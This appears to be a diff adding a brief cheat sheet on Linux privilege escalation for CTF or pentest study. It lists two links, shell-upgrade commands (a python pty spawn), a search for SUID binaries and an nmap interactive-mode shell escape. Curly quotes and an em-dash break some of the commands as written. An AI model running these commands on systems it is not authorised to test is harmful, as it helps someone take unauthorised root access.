@@ -1,0 +1,16 @@
+Privilege Escalation
+
+https://medium.com/@maripi.vijay2/linux-privilege-escalation-a0607bce1700
+
+https://ctfsearch.hackmap.win/?q=privilege%20
+
+/bin/sh -I
+python -c 'import pty; pty.spawn("/bin/sh”)’
+
+privilege esclation
+find / -perm -4000 2>/dev/null
+
+Nmap interactive mode
+nmap —interactive
+!sh
+
